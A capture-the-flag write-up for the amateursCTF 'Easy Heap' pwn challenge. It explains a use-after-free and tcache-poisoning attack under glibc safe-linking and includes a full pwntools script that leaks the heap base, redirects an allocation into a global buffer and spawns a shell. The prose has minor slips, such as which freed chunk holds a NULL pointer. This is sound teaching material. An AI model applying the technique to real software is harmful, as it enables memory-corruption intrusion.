# Easy Heap – amateursCTF Pwn Write-Up

## Challenge Overview

- **Category:** Pwn  
- **Binary:** `chal` (64-bit ELF, no PIE, GLIBC 2.38 with tcache safe-linking enabled)  
- **Remote:** `nc amt.rs 37557`  
- **Flag:** stored in `/srv/app/flag` inside the jail (see `Dockerfile`)

From the Dockerfile:

```dockerfile
from pwn.red/jail

copy --from=ubuntu:25.10 / /srv
copy chal /srv/app/run
copy flag /srv/app/flag

env JAIL_TIME=0
```

So each connection drops us into a jailed Ubuntu 25.10 environment running `chal`.  
As usual, we want code execution (a shell) and then `cat /srv/app/flag`.

---

## Binary Functionality (High Level)

The binary implements a tiny heap playground with an array of heap chunk pointers and a simple menu:

- Option `0 idx` – allocate a chunk and store the pointer at index `idx`.
- Option `1 idx` – free the chunk at index `idx`.
- Option `2 idx` – edit the content of chunk `idx` (reads arbitrary bytes from stdin).
- Option `3 idx` – show / leak the first 8 bytes from chunk `idx`.
- Option `67` – secret option that calls a function named `check`.

There is also a global buffer:

- `char checkbuf[...]` in `.bss`.

The `check` function compares `checkbuf` against the specific string:

```text
ALL HAIL OUR LORD AND SAVIOR TEEMO
```

If they match, it prints `"check."` and then calls `system("sh")`, giving us a shell.

Initially, we have no way to write to `checkbuf` directly, so the goal is to use heap bugs to redirect a heap allocation into `checkbuf` (classic tcache poisoning).

---

## Heap Bug: Use-After-Free + Tcache Poisoning

The binary uses `malloc`/`free` on GLIBC 2.38, so **tcache safe-linking** is enabled.  
In safe-linking, the forward pointer (`fd`) of a freed chunk is stored as:

```text
fd_stored = fd_real ^ (heap_base >> 12)
```

To perform tcache poisoning, we need:

1. A way to leak a value that depends on `heap_base`, so we can undo the XOR.
2. A way to write a forged `fd_stored` into a freed chunk.

This binary gives us both:

- After freeing a chunk, option `3` (show) will print the first 8 bytes of the freed chunk, which now hold the **encoded `fd` pointer**.
- Option `2` (edit) does not check whether a chunk is allocated or freed, so we can **edit freed chunks** → use-after-free.

---

## Exploit Strategy

The full exploit is implemented in `Pwn/Easy Heap/solve.py`.  
The key steps are:

1. **Fill tcache and set up two chunks**

   ```python
   for i in range(2):
       io.sendlineafter(b"> ", b"0")      # alloc
       io.sendlineafter(b"> ", str(i).encode())
   ```

   We allocate two chunks at indices `0` and `1` (same size).

2. **Free both chunks**

   ```python
   for i in range(2):
       io.sendlineafter(b"> ", b"1")      # free
       io.sendlineafter(b"> ", str(i).encode())
   ```

   Now both chunks are in the tcache bin. Because of safe-linking:

   - The **second freed chunk’s `fd`** is `NULL`, so its stored value is:
     ```text
     0 ^ (heap_base >> 12) = heap_base >> 12
     ```

3. **Leak the heap base using the print primitive**

   ```python
   io.sendlineafter(b"> ", b"3")
   io.sendlineafter(b"> ", b"0")

   io.recvuntil(b"data> ")
   heap_base = u64(io.recv(8)) << 12
   ```

   - Showing index `0` leaks the encoded `fd` of the **second** chunk in the tcache list.
   - Because we know its real `fd` is `NULL`, the leak is exactly `heap_base >> 12`.
   - We invert safe-linking by shifting back: `heap_base = leak << 12`.

4. **Forge a tcache entry pointing to `checkbuf`**

   We now edit the freed chunk at index `1` and overwrite its `fd` field:

   ```python
   io.sendlineafter(b"> ", b"2")
   io.sendlineafter(b"> ", b"1")
   io.sendlineafter(b"data> ",
                    p64(exe.sym.checkbuf ^ (heap_base >> 12)))
   ```

   - `exe.sym.checkbuf` is the address of the global buffer.
   - To pass the safe-linking check, we store
     ```text
     fd_stored = checkbuf ^ (heap_base >> 12)
     ```
   - The next allocation from this tcache bin will return a chunk at `checkbuf`.

5. **Trigger the poisoned tcache and overwrite `checkbuf`**

   We allocate twice again:

   ```python
   for i in range(2):
       io.sendlineafter(b"> ", b"0")
       io.sendlineafter(b"> ", str(i).encode())
   ```

   - First allocation returns the real freed chunk.
   - Second allocation returns a “chunk” whose pointer is actually `checkbuf`.

   Then we edit index `1` to write the magic string:

   ```python
   io.sendlineafter(b"> ", b"2")
   io.sendlineafter(b"> ", b"1")
   io.sendlineafter(
       b"data> ",
       b"ALL HAIL OUR LORD AND SAVIOR TEEMO\x00",
   )
   ```

   At this point, `checkbuf` holds the exact string that `check()` expects.

6. **Call the secret menu option and get a shell**

   ```python
   io.sendlineafter(b"> ", b"67")
   io.interactive()
   ```

   Option `67` calls `check()`, which verifies `checkbuf`, prints `"check."`, and calls `system("sh")`.  
   From the shell, we simply run:

   ```sh
   cat /srv/app/flag
   ```

   and read the flag.

---

## Final Exploit Script

The complete exploit is in `Pwn/Easy Heap/solve.py` and works both locally and against the remote service:

```python
from pwn import *

exe = context.binary = ELF(args.EXE or "./chal")
libc = ELF(exe.libc.path)

io = remote("amt.rs", 37557)

# 1) allocate two chunks
for i in range(2):
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", str(i).encode())

# 2) free them
for i in range(2):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(i).encode())

# 3) leak heap base
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"> ", b"0")
io.recvuntil(b"data> ")
heap_base = u64(io.recv(8)) << 12

# 4) poison tcache -> checkbuf
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"data> ",
                 p64(exe.sym.checkbuf ^ (heap_base >> 12)))

# 5) re-allocate and overwrite checkbuf
for i in range(2):
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"> ", str(i).encode())

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", b"1")
io.sendlineafter(
    b"data> ", b"ALL HAIL OUR LORD AND SAVIOR TEEMO\x00"
)

# 6) trigger the check and pop shell
io.sendlineafter(b"> ", b"67")
io.interactive()
```

---

## Takeaways

- Even with **safe-linking** enabled, tcache poisoning is still possible if you can:
  - Leak an encoded tcache pointer (to recover `heap_base >> 12`), and
  - Edit freed chunks (use-after-free).
- Single‑purpose “check” functions with hardcoded strings are a great target: if there is any way to redirect a pointer to a global buffer, you can often win with just one overwrite.
- This is a very approachable example of modern heap exploitation on recent GLIBC where you can practice safe-linking arithmetic and tcache internals.
